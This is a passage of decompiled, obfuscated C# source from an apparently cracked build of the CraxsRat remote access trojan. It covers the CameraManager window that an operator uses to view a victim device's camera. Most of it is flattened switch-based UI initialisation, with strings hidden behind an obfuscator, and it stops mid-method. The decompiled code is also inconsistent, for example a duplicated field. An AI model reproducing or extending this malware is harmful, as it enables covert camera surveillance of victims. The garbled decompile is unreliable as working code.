// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.CameraManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class CameraManager : Form
  {
    public AsyncVoidMethodBuilder \u0024Builder;
    internal Build \u0024VB\u0024Me;
    internal string \u0024VB\u0024ResumableLocal_ncPath\u00240;
    internal DateTime \u0024VB\u0024ResumableLocal_finish\u00241;
    internal string[] \u0024VB\u0024ResumableLocal_i\u00242;
    internal string[] \u0024VB\u0024ResumableLocal_p\u00243;
    internal int \u0024S4;
    internal int \u0024VB\u0024ResumableLocal_u\u00245;
    internal FileStream \u0024VB\u0024ResumableLocal_fs\u00246;
    internal TaskAwaiter \u0024A0;
    private IContainer components;
    private bool _keyback;
    public string _Call;
    public string Title;
    private List<Rectangle> RectInputText0;
    private IContainer components;

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 999184061;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -((112383577 * (447179567 * -208896304) + ~(285677877 * (593043706 * 20868619)) * -880464145 - num2 ^ ~1788603832) - -1461414509)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              int num4 = ((Color_Box0) this).components == null ? 1199535108 : (num4 = -389566278);
              num1 = num4 ^ (int) num3 * 1028859165;
              continue;
            case 3:
              ((Color_Box0) this).components.Dispose();
              num1 = (int) num3 * -351030850 ^ 474433016;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((Color_Box0) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = -310722274;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(~-num1 * -2105719603)) % 205U)
        {
          case 0:
            this.DrakeUIAvatar2.Symbol = 61470;
            num1 = (int) num2 * 1092496257 ^ -677838240;
            continue;
          case 1:
            this.BackColor = Color.Black;
            num1 = (int) num2 * -2140016905 ^ 529827409;
            continue;
          case 2:
            this.Panel2.Controls.Add((Control) this.cmbofoucs);
            num1 = (int) num2 * 1295286650 ^ 117781535;
            continue;
          case 3:
            this.statustext.Dock = DockStyle.Fill;
            num1 = (int) num2 * -606347071 ^ -1813645035;
            continue;
          case 4:
            this.hidetoolbtn.Size = new Size(34, 25);
            this.hidetoolbtn.Style = UIStyle.Custom;
            this.hidetoolbtn.Symbol = 61550;
            num1 = (int) num2 * 1637820310 ^ -348654345;
            continue;
          case 5:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * -978066505 ^ 1892639865;
            continue;
          case 6:
            this.Name = EXGuarder.\u0034B5F0458;
            num1 = (int) num2 * -1430767917 ^ -1013014745;
            continue;
          case 7:
            this.Panel3.Name = EXGuarder.\u0032C06174A;
            num1 = (int) num2 * 1584495232 ^ 765326760;
            continue;
          case 8:
            this.Panel3.BackColor = Color.Black;
            num1 = (int) num2 * 1482064041 ^ -29787619;
            continue;
          case 9:
            this.startbtn.Style = UIStyle.Custom;
            this.startbtn.StyleCustomMode = true;
            this.startbtn.TabIndex = 44;
            this.startbtn.Text = EXGuarder.\u0034F31296E;
            num1 = (int) num2 * 60128551 ^ 434400080;
            continue;
          case 10:
            this.Label2.TabIndex = 15;
            num1 = (int) num2 * -2094637360 ^ 133333461;
            continue;
          case 11:
            this.comboqualty.MaxDropDownItems = 25;
            num1 = (int) num2 * 593274174 ^ 1554263102;
            continue;
          case 12:
            this.statustext.Size = new Size(771, 16);
            this.statustext.TabIndex = 15;
            this.statustext.Text = EXGuarder.\u003780B7610;
            this.DrakeUILampLED1.Color = Color.Lime;
            num1 = (int) num2 * -1670161462 ^ -1330942390;
            continue;
          case 13:
            this.DrakeUIAvatar2.Margin = new Padding(4);
            this.DrakeUIAvatar2.Name = EXGuarder.\u0034210076A;
            num1 = (int) num2 * -1445946409 ^ 404332628;
            continue;
          case 14:
            this.SuspendLayout();
            this.CAM0.BackColor = Color.Black;
            num1 = (int) num2 * 580458563 ^ -423182824;
            continue;
          case 15:
            this.qultytext.Text = EXGuarder.\u003705A372B;
            num1 = (int) num2 * -1728545011 ^ -344063018;
            continue;
          case 16:
            this.combocam.Text = EXGuarder.\u0036B32122C;
            num1 = (int) num2 * 306876154 ^ 1245875957;
            continue;
          case 17:
            this.Panel2.Controls.Add((Control) this.ClientPic);
            num1 = (int) num2 * -1714616623 ^ 484820788;
            continue;
          case 18:
            this.hidetoolbtn.RectColor = Color.Transparent;
            num1 = (int) num2 * 2032893633 ^ 868087092;
            continue;
          case 19:
            this.Button3.Tag = (object) EXGuarder.\u00308426703;
            this.Button3.Text = EXGuarder.\u00348541F3B;
            num1 = (int) num2 * 1541728175 ^ 694485973;
            continue;
          case 20:
            this.DrakeUIToolTip1.SetToolTip((Control) this.Sbtn, EXGuarder.\u003060A4E78);
            num1 = (int) num2 * 1584481372 ^ -1090982854;
            continue;
          case 21:
            this.Sbtn.RectDisableColor = Color.White;
            num1 = (int) num2 * -364679067 ^ -627915320;
            continue;
          case 22:
            this.DrakeUIToolTip1.SetToolTip((Control) this.Button3, EXGuarder.\u0032A656A2B);
            num1 = (int) num2 * -1771504473 ^ -1836521397;
            continue;
          case 23:
            this.startbtn.Size = new Size(87, 28);
            num1 = (int) num2 * -650372522 ^ 1602882770;
            continue;
          case 24:
            this.DrakeUIAvatar2.TabIndex = 28;
            this.DrakeUIAvatar2.Tag = (object) EXGuarder.\u00308426703;
            this.DrakeUIAvatar2.Text = EXGuarder.\u00348541F3B;
            num1 = (int) num2 * -1979943767 ^ 937370884;
            continue;
          case 25:
            this.Label2.Size = new Size(50, 21);
            num1 = (int) num2 * 19773384 ^ -867605715;
            continue;
          case 26:
            this.Sbtn.Size = new Size(87, 28);
            num1 = (int) num2 * -1815180462 ^ 1072494026;
            continue;
          case 27:
            this.ClientPic.Name = EXGuarder.\u00345021B3C;
            num1 = (int) num2 * 1002595524 ^ 1591259794;
            continue;
          case 28:
            this.combosizes.FillColor = Color.Black;
            num1 = (int) num2 * 1679810963 ^ -1388956893;
            continue;
          case 29:
            this.combotext.TabIndex = 40;
            this.combotext.Text = EXGuarder.\u003551F7847;
            num1 = (int) num2 * 1490859057 ^ 451291146;
            continue;
          case 30:
            this.pinbtn.Name = EXGuarder.\u003214A4157;
            this.pinbtn.RectColor = Color.Transparent;
            num1 = (int) num2 * 1547584524 ^ 150014402;
            continue;
          case 31:
            this.Sbtn.Style = UIStyle.Custom;
            this.Sbtn.TabIndex = 20;
            num1 = (int) num2 * -235813839 ^ -131515395;
            continue;
          case 32:
            this.comboqualty.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num2 * -935351774 ^ -1201460848;
            continue;
          case 33:
            this.comboqualty.TabIndex = 43;
            num1 = (int) num2 * 897538642 ^ -682971361;
            continue;
          case 34:
            this.DrakeUIAvatar2.SymbolSize = 25;
            num1 = (int) num2 * -1081393377 ^ 1436529731;
            continue;
          case 35:
            this.comboqualty.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * -36680589 ^ -984440317;
            continue;
          case 36:
            this.hidetoolbtn.ForeColor = Color.Red;
            this.hidetoolbtn.Location = new Point(6, 383);
            this.hidetoolbtn.Name = EXGuarder.\u0036C673D63;
            num1 = (int) num2 * -1312839176 ^ -37080827;
            continue;
          case 37:
            this.DrakeUIAvatar2.Style = UIStyle.Custom;
            this.DrakeUIAvatar2.StyleCustomMode = true;
            num1 = (int) num2 * 549356408 ^ -412004265;
            continue;
          case 38:
            this.Panel1.Controls.Add((Control) this.Panel3);
            this.Panel1.Controls.Add((Control) this.fpstext);
            num1 = (int) num2 * 921574514 ^ -1881428128;
            continue;
          case 39:
            this.combosizes.Font = new Font(EXGuarder.\u0032D603C5F, 9f);
            num1 = (int) num2 * -50468190 ^ -1009947615;
            continue;
          case 40:
            this.Panel4.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 1728071040 ^ 384286757;
            continue;
          case 41:
            this.combocam.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1692340057 ^ 589601104;
            continue;
          case 42:
            this.Panel4.SuspendLayout();
            this.Panel2.SuspendLayout();
            num1 = (int) num2 * -455051211 ^ -1980569782;
            continue;
          case 43:
            this.Button3.FillColor = Color.Black;
            num1 = (int) num2 * 2072140719 ^ -1167336045;
            continue;
          case 44:
            this.combocam.StyleCustomMode = true;
            num1 = (int) num2 * 1187262374 ^ -1031618457;
            continue;
          case 45:
            this.CAM0 = new PictureBox();
            num1 = (int) num2 * -162855367 ^ -1013406826;
            continue;
          case 46:
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * -198338292 ^ 793756886;
            continue;
          case 47:
            this.Panel4.BackColor = Color.Black;
            this.Panel4.Controls.Add((Control) this.statustext);
            num1 = (int) num2 * 1509316118 ^ -1237719593;
            continue;
          case 48:
            this.comboqualty.ForeColor = Color.White;
            this.comboqualty.Items.AddRange(new object[10]
            {
              (object) EXGuarder.\u00301506C3D,
              (object) EXGuarder.\u003482D5171,
              (object) EXGuarder.\u0035714291E,
              (object) EXGuarder.\u0035A687472,
              (object) EXGuarder.\u003245D7027,
              (object) EXGuarder.\u00315574D0E,
              (object) EXGuarder.\u003213D4F41,
              (object) EXGuarder.\u00325331D3A,
              (object) EXGuarder.\u0035A6F146A,
              (object) EXGuarder.\u0030E1D0550
            });
            num1 = (int) num2 * 1075910377 ^ 1520122285;
            continue;
          case 49:
            this.Label1.Text = EXGuarder.\u003724C0E1D;
            num1 = (int) num2 * 1313147275 ^ 370385662;
            continue;
          case 50:
            this.combotext.Font = new Font(EXGuarder.\u0032D603C5F, 8.7f, FontStyle.Bold);
            this.combotext.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -679877069 ^ 328528799;
            continue;
          case 51:
            this.CAM0.Size = new Size(731, 486);
            num1 = (int) num2 * 1290326462 ^ -1290249920;
            continue;
          case 52:
            this.Panel2.Location = new Point(0, 503);
            num1 = (int) num2 * 1902976719 ^ -1854703360;
            continue;
          case 53:
            this.DrakeUIAvatar2.AvatarSize = 30;
            num1 = (int) num2 * 989498598 ^ -1547698805;
            continue;
          case 54:
            this.Panel1.Controls.Add((Control) this.CAM0);
            num1 = (int) num2 * -761774097 ^ -2117407737;
            continue;
          case 55:
            this.Label2.AutoSize = true;
            num1 = (int) num2 * 1687080059 ^ -1568671112;
            continue;
          case 56:
            this.Controls.Add((Control) this.Panel4);
            this.Font = new Font(EXGuarder.\u0032D603C5F, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
            num1 = (int) num2 * 167800241 ^ -1125827913;
            continue;
          case 57:
            this.DrakeUIToolTip1.ForeColor = Color.FromArgb(239, 239, 239);
            num1 = (int) num2 * -943940192 ^ -1281852930;
            continue;
          case 58:
            this.hidetoolbtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * -1006929463 ^ -1789664591;
            continue;
          case 59:
            this.comboqualty = new DrakeUIComboBox();
            num1 = (int) num2 * -213941095 ^ 887616431;
            continue;
          case 60:
            this.Panel3.Dock = DockStyle.Right;
            this.Panel3.Location = new Point(731, 17);
            num1 = (int) num2 * 1689744019 ^ -24036718;
            continue;
          case 61:
            this.ClientPic.TabStop = false;
            num1 = (int) num2 * 920050011 ^ 1509084235;
            continue;
          case 62:
            this.cmbofoucs.DropDownStyle = ComboBoxStyle.DropDownList;
            this.cmbofoucs.FlatStyle = FlatStyle.Flat;
            this.cmbofoucs.ForeColor = Color.White;
            num1 = (int) num2 * 1061755150 ^ -732968637;
            continue;
          case 63:
            this.Frames = new Timer(((Color_Box0) this).components);
            num1 = (int) num2 * 1611571211 ^ -12611210;
            continue;
          case 64:
            this.Sbtn.FillColor = Color.Black;
            num1 = (int) num2 * -65004384 ^ -911907714;
            continue;
          case 65:
            this.DrakeUIToolTip1.SetToolTip((Control) this.startbtn, EXGuarder.\u003060A4E78);
            num1 = (int) num2 * -1424387153 ^ 1167403286;
            continue;
          case 66:
            this.comboqualty.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * 1222682665 ^ 1004360952;
            continue;
          case 67:
            this.Sbtn.Enabled = false;
            num1 = (int) num2 * -951328052 ^ -866970433;
            continue;
          case 68:
            this.DrakeUILampLED1.Size = new Size(15, 16);
            num1 = (int) num2 * -5913285 ^ -188509497;
            continue;
          case 69:
            this.cmbofoucs.Location = new Point(337, 213);
            this.cmbofoucs.Name = EXGuarder.\u0030038470D;
            this.cmbofoucs.Size = new Size(83, 25);
            this.cmbofoucs.TabIndex = 16;
            this.Label1.AutoSize = true;
            num1 = (int) num2 * 549460313 ^ -649978511;
            continue;
          case 70:
            this.fpstext.TabIndex = 1;
            this.fpstext.Text = EXGuarder.\u0030F504120;
            this.fpstext.UseMnemonic = false;
            num1 = (int) num2 * -1872210049 ^ -1956348529;
            continue;
          case 71:
            this.combosizes.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.combosizes.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.combosizes.Size = new Size(115, 26);
            this.combosizes.Style = UIStyle.Custom;
            this.combosizes.StyleCustomMode = true;
            num1 = (int) num2 * 1992031397 ^ -559191985;
            continue;
          case 72:
            this.DrakeUILampLED1.Enabled = false;
            this.DrakeUILampLED1.Location = new Point(771, 0);
            num1 = (int) num2 * 885758115 ^ 1933727813;
            continue;
          case 73:
            ((ISupportInitialize) this.ClientPic).EndInit();
            this.Panel3.ResumeLayout(false);
            num1 = (int) num2 * 1509913672 ^ -682998305;
            continue;
          case 74:
            this.ToolTip1.ForeColor = Color.DarkTurquoise;
            this.DrakeUIToolTip1.BackColor = Color.FromArgb(54, 54, 54);
            num1 = (int) num2 * -2109148541 ^ -2028346209;
            continue;
          case 75:
            this.CAM0.SizeMode = PictureBoxSizeMode.StretchImage;
            this.CAM0.TabIndex = 0;
            num1 = (int) num2 * -2082965126 ^ -1193924683;
            continue;
          case 76:
            this.CAM0.TabStop = false;
            this.Frames.Interval = 1000;
            num1 = (int) num2 * 455614303 ^ -903180060;
            continue;
          case 77:
            this.DrakeUIAvatar2.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            num1 = (int) num2 * 360561480 ^ -846273087;
            continue;
          case 78:
            this.combosizes.Name = EXGuarder.\u00305180E0E;
            this.combosizes.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * 1292613693 ^ 532613638;
            continue;
          case 79:
            this.DrakeUIAvatar2 = new DrakeUIAvatar();
            num1 = (int) num2 * -1442903363 ^ -1070499224;
            continue;
          case 80:
            this.combocam.Font = new Font(EXGuarder.\u0032D603C5F, 9f);
            this.combocam.ForeColor = Color.White;
            this.combocam.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u0036B32122C,
              (object) EXGuarder.\u0034A610A61
            });
            num1 = (int) num2 * -348832558 ^ -1881644307;
            continue;
          case 81:
            this.combocam.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * 254645488 ^ -1019309735;
            continue;
          case 82:
            this.DrakeUIAvatar2.Location = new Point(6, 415);
            num1 = (int) num2 * 1906883900 ^ -2097457399;
            continue;
          case 83:
            this.DrakeUILampLED1.Text = EXGuarder.\u0034F222B64;
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUILampLED1, EXGuarder.\u0033B64673E);
            num1 = (int) num2 * 1553368105 ^ 2023469138;
            continue;
          case 84:
            this.hidetoolbtn.TabIndex = 2;
            num1 = (int) num2 * 531002912 ^ -1847264296;
            continue;
          case 85:
            this.ToolTip1.BackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * 119094376 ^ 217045214;
            continue;
          case 86:
            this.comboqualty.MinimumSize = new Size(63, 0);
            num1 = (int) num2 * 993905479 ^ -1156268594;
            continue;
          case 87:
            this.DrakeUILampLED1.Visible = false;
            num1 = (int) num2 * 422705126 ^ 220812135;
            continue;
          case 88:
            this.Label2.Name = EXGuarder.\u0035A2E201E;
            num1 = (int) num2 * -1393877543 ^ 921927468;
            continue;
          case 89:
            this.ResumeLayout(false);
            num1 = (int) num2 * 919022275 ^ -813928389;
            continue;
          case 90:
            this.comboqualty.StyleCustomMode = true;
            num1 = (int) num2 * 562727565 ^ -1774466736;
            continue;
          case 91:
            this.startbtn = new DrakeUIButton();
            this.ClientPic = new PictureBox();
            this.ToolTip1 = new ToolTip(((Color_Box0) this).components);
            this.DrakeUIToolTip1 = new DrakeUIToolTip(((Color_Box0) this).components);
            this.savetimer = new Timer(((Color_Box0) this).components);
            this.pinbtn = new DrakeUIButtonIcon();
            this.Panel3 = new Panel();
            num1 = (int) num2 * 487016744 ^ 826134148;
            continue;
          case 92:
            this.pinbtn.Size = new Size(34, 25);
            num1 = (int) num2 * -1965305040 ^ -871061903;
            continue;
          case 93:
            this.Button3.Size = new Size(34, 28);
            num1 = (int) num2 * 1330940729 ^ -547994872;
            continue;
          case 94:
            this.DrakeUIToolTip1.OwnerDraw = true;
            this.pinbtn.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.pinbtn.BackColor = Color.Transparent;
            num1 = (int) num2 * -1938330024 ^ -791532689;
            continue;
          case 95:
            this.Panel1 = new Panel();
            this.Button3 = new DrakeUIAvatar();
            num1 = (int) num2 * 458125671 ^ 435489987;
            continue;
          case 96:
            this.DrakeUILampLED1.TabIndex = 22;
            num1 = (int) num2 * 478551211 ^ 1954293617;
            continue;
          case 97:
            this.Button3.Font = new Font(EXGuarder.\u0032D603C5F, 12f);
            this.Button3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Button3.Location = new Point(6, 451);
            this.Button3.Margin = new Padding(4);
            this.Button3.Name = EXGuarder.\u0031B352220;
            num1 = (int) num2 * -2138275607 ^ 507401314;
            continue;
          case 98:
            this.DrakeUILampLED1.Name = EXGuarder.\u0034F222B64;
            num1 = (int) num2 * -1525175082 ^ 1344078548;
            continue;
          case 99:
            this.DrakeUIAvatar2.Font = new Font(EXGuarder.\u0032D603C5F, 9f);
            this.DrakeUIAvatar2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -191739008 ^ -675713198;
            continue;
          case 100:
            this.combocam.FillColor = Color.Black;
            num1 = (int) num2 * 2130595488 ^ -433692513;
            continue;
          case 101:
            this.Panel4.Controls.Add((Control) this.DrakeUILampLED1);
            num1 = (int) num2 * -1424953847 ^ 1138726561;
            continue;
          case 102:
            this.startbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1822589578 ^ 340614107;
            continue;
          case 103:
            this.Panel1.Name = EXGuarder.\u00354195F12;
            this.Panel1.Size = new Size(786, 503);
            num1 = (int) num2 * 1161056030 ^ 583607096;
            continue;
          case 104:
            this.Text = EXGuarder.\u0034B5F0458;
            ((ISupportInitialize) this.CAM0).EndInit();
            this.Panel1.ResumeLayout(false);
            this.Panel4.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            this.Panel2.PerformLayout();
            num1 = (int) num2 * 366600262 ^ 1278535605;
            continue;
          case 105:
            this.hidetoolbtn.SymbolSize = 30;
            num1 = (int) num2 * -327729343 ^ -1408766565;
            continue;
          case 106:
            this.Button3.Cursor = Cursors.Hand;
            num1 = (int) num2 * -174861484 ^ -1461559565;
            continue;
          case 107:
            this.Panel3.Controls.Add((Control) this.DrakeUIAvatar2);
            this.Panel3.Controls.Add((Control) this.pinbtn);
            this.Panel3.Controls.Add((Control) this.hidetoolbtn);
            num1 = (int) num2 * 173823854 ^ 1787112826;
            continue;
          case 108:
            this.fpstext = new Label();
            this.Panel4 = new Panel();
            this.statustext = new Label();
            this.DrakeUILampLED1 = new DrakeUILampLED();
            num1 = (int) num2 * 814310006 ^ 209525395;
            continue;
          case 109:
            this.combosizes.TabIndex = 41;
            this.combosizes.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * 1702903935 ^ 971647795;
            continue;
          case 110:
            this.Panel3.Controls.Add((Control) this.Button3);
            num1 = (int) num2 * -758788139 ^ -15516307;
            continue;
          case 111:
            this.fpstext.Dock = DockStyle.Top;
            this.fpstext.Font = new Font(EXGuarder.\u0032D603C5F, 8f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1217691219 ^ 1325596139;
            continue;
          case 112:
            this.qultytext.Font = new Font(EXGuarder.\u0032D603C5F, 8.7f, FontStyle.Bold);
            this.qultytext.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 515050167 ^ 1813415042;
            continue;
          case 113:
            this.Panel2.Controls.Add((Control) this.combotext);
            num1 = (int) num2 * 1144791821 ^ 213480171;
            continue;
          case 114:
            this.DrakeUIAvatar2.Cursor = Cursors.Hand;
            this.DrakeUIAvatar2.FillColor = Color.Black;
            num1 = (int) num2 * -1460795892 ^ -708916830;
            continue;
          case 115:
            this.Panel2.Controls.Add((Control) this.combosizes);
            this.Panel2.Controls.Add((Control) this.Sbtn);
            this.Panel2.Controls.Add((Control) this.startbtn);
            this.Panel2.Controls.Add((Control) this.Label2);
            num1 = (int) num2 * 1476863984 ^ 1531737164;
            continue;
          case 116:
            this.combocam.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -812263348 ^ -918262193;
            continue;
          case 117:
            this.pinbtn.Font = new Font(EXGuarder.\u0032D603C5F, 12f);
            this.pinbtn.ForeColor = Color.Red;
            this.pinbtn.Location = new Point(6, 352);
            num1 = (int) num2 * -935995681 ^ -94267555;
            continue;
          case 118:
            this.Label1.TabIndex = 14;
            num1 = (int) num2 * 2008734756 ^ 35700841;
            continue;
          case 119:
            goto label_1;
          case 120:
            this.Sbtn.Radius = 15;
            this.Sbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1787736650 ^ 875753040;
            continue;
          case 121:
            this.DrakeUIToolTip1.SetToolTip((Control) this.pinbtn, EXGuarder.\u0035E6E6D02);
            num1 = (int) num2 * 1037884291 ^ -1550480525;
            continue;
          case 122:
            this.Sbtn.Text = EXGuarder.\u0033D483B1D;
            num1 = (int) num2 * -2052249812 ^ -1173251806;
            continue;
          case 123:
            this.qultytext.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * 776249201 ^ 664839971;
            continue;
          case 124:
            this.Label2.BackColor = Color.FromArgb(10, 10, 10);
            this.Label2.Font = new Font(EXGuarder.\u0032D603C5F, 10f, FontStyle.Bold);
            num1 = (int) num2 * 213171429 ^ -1905784118;
            continue;
          case 125:
            this.combotext = new Label();
            this.combosizes = new DrakeUIComboBox();
            this.Sbtn = new DrakeUIButton();
            num1 = (int) num2 * -615558767 ^ -1184763849;
            continue;
          case 126:
            this.combocam.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.combocam.Size = new Size(86, 26);
            this.combocam.Style = UIStyle.Custom;
            num1 = (int) num2 * 269914053 ^ -1554695002;
            continue;
          case (uint) sbyte.MaxValue:
            this.ClientPic.BackColor = Color.Transparent;
            this.ClientPic.Dock = DockStyle.Left;
            this.ClientPic.Location = new Point(0, 0);
            num1 = (int) num2 * 1976701488 ^ -1456033264;
            continue;
          case 128:
            this.comboqualty.Location = new Point(372, 10);
            num1 = (int) num2 * -1345550483 ^ 1647814457;
            continue;
          case 129:
            this.Label2.ForeColor = Color.FromArgb(95, 95, 250);
            this.Label2.Location = new Point(426, 215);
            num1 = (int) num2 * 919076187 ^ 1943206580;
            continue;
          case 130:
            this.cmbofoucs.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u0034C283D2F,
              (object) EXGuarder.\u0034F4C4F46
            });
            num1 = (int) num2 * -99872832 ^ 1325229377;
            continue;
          case 131:
            this.Panel3.TabIndex = 30;
            this.AutoScaleDimensions = new SizeF(7f, 17f);
            num1 = (int) num2 * -1491171285 ^ 2118354363;
            continue;
          case 132:
            this.comboqualty.Size = new Size(82, 26);
            this.comboqualty.Style = UIStyle.Custom;
            num1 = (int) num2 * 967255724 ^ 1993840969;
            continue;
          case 133:
            this.qultytext.Location = new Point(461, 10);
            this.qultytext.Name = EXGuarder.\u00358066C59;
            this.qultytext.Size = new Size(78, 28);
            this.qultytext.TabIndex = 42;
            num1 = (int) num2 * -887162191 ^ -1859461406;
            continue;
          case 134:
            this.Label1.Size = new Size(57, 21);
            num1 = (int) num2 * 398793443 ^ -345441136;
            continue;
          case 135:
            this.DrakeUIToolTip1.SetToolTip((Control) this.hidetoolbtn, EXGuarder.\u00366110970);
            this.fpstext.BackColor = Color.Transparent;
            num1 = (int) num2 * -46879841 ^ 609633630;
            continue;
          case 136:
            this.Panel2.BackColor = Color.Black;
            this.Panel2.BackgroundImageLayout = ImageLayout.Zoom;
            this.Panel2.Controls.Add((Control) this.combocam);
            this.Panel2.Controls.Add((Control) this.qultytext);
            this.Panel2.Controls.Add((Control) this.comboqualty);
            num1 = (int) num2 * 972690311 ^ -848239265;
            continue;
          case 137:
            this.Label2 = new Label();
            this.cmbofoucs = new ComboBox();
            this.Label1 = new Label();
            this.Panel2 = new Panel();
            this.combocam = new DrakeUIComboBox();
            this.qultytext = new Label();
            num1 = (int) num2 * 1172563917 ^ -1900558358;
            continue;
          case 138:
            this.ClientSize = new Size(786, 558);
            num1 = (int) num2 * -1921137619 ^ -617910750;
            continue;
          case 139:
            this.pinbtn.TabIndex = 29;
            this.pinbtn.TagString = EXGuarder.\u00356535F16;
            num1 = (int) num2 * -551333763 ^ 1473544284;
            continue;
          case 140:
            this.hidetoolbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -2056144353 ^ -1534753920;
            continue;
          case 141:
            this.combocam.Margin = new Padding(4, 5, 4, 5);
            this.combocam.MaxDropDownItems = 25;
            num1 = (int) num2 * -395523235 ^ -728801840;
            continue;
          case 142:
            this.startbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1946645807 ^ 1485806170;
            continue;
          case 143:
            this.DrakeUIAvatar2.BackColor = Color.Transparent;
            num1 = (int) num2 * -808966385 ^ -1920638333;
            continue;
          case 144:
            this.combocam.Location = new Point(148, 8);
            num1 = (int) num2 * -285022076 ^ 2081809130;
            continue;
          case 145:
            this.fpstext.Size = new Size(786, 17);
            num1 = (int) num2 * -608666478 ^ -1851026008;
            continue;
          case 146:
            this.fpstext.ForeColor = Color.Lime;
            this.fpstext.Location = new Point(0, 0);
            this.fpstext.Name = EXGuarder.\u0033F576C70;
            num1 = (int) num2 * -1073690027 ^ 505445905;
            continue;
          case 147:
            this.Opacity = 0.0;
            num1 = (int) num2 * 532265500 ^ -1421368627;
            continue;
          case 148:
            this.Panel4.Location = new Point(0, 542);
            this.Panel4.Name = EXGuarder.\u0035A134004;
            num1 = (int) num2 * -1657577809 ^ 1127704600;
            continue;
          case 149:
            this.ClientPic.Size = new Size(48, 39);
            num1 = (int) num2 * 63428820 ^ -1261326166;
            continue;
          case 150:
            this.Button3.Symbol = 61469;
            this.Button3.SymbolSize = 30;
            this.Button3.TabIndex = 26;
            num1 = (int) num2 * -1635685596 ^ -1998147917;
            continue;
          case 151:
            this.comboqualty.Name = EXGuarder.\u0030A41694D;
            this.comboqualty.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * -375754853 ^ -2120469250;
            continue;
          case 152:
            this.Sbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 778771712 ^ -1173055215;
            continue;
          case 153:
            this.combotext.Location = new Point(699, 10);
            num1 = (int) num2 * -1929624861 ^ -1965287695;
            continue;
          case 154:
            this.Label1.BackColor = Color.FromArgb(10, 10, 10);
            this.Label1.Font = new Font(EXGuarder.\u0032D603C5F, 10f, FontStyle.Bold);
            this.Label1.ForeColor = Color.FromArgb(95, 95, 250);
            this.Label1.Location = new Point(426, 176);
            num1 = (int) num2 * 1069675390 ^ 541442893;
            continue;
          case 155:
            this.Panel1.Dock = DockStyle.Fill;
            this.Panel1.Location = new Point(0, 0);
            num1 = (int) num2 * 1351450684 ^ 1068234582;
            continue;
          case 156:
            this.combotext.TextAlign = ContentAlignment.MiddleLeft;
            this.combosizes.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num2 * 825932534 ^ 2068098614;
            continue;
          case 157:
            goto label_3;
          case 158:
            this.MinimumSize = new Size(352, 333);
            num1 = (int) num2 * -685427733 ^ -492837955;
            continue;
          case 159:
            this.pinbtn.Style = UIStyle.Custom;
            num1 = (int) num2 * 520664714 ^ 1534443871;
            continue;
          case 160:
            this.startbtn.RectDisableColor = Color.White;
            num1 = (int) num2 * -1114394594 ^ -86899982;
            continue;
          case 161:
            this.comboqualty.FillColor = Color.Black;
            this.comboqualty.Font = new Font(EXGuarder.\u0032D603C5F, 9f);
            num1 = (int) num2 * 812102486 ^ 958528723;
            continue;
          case 162:
            this.combotext.Name = EXGuarder.\u00376776248;
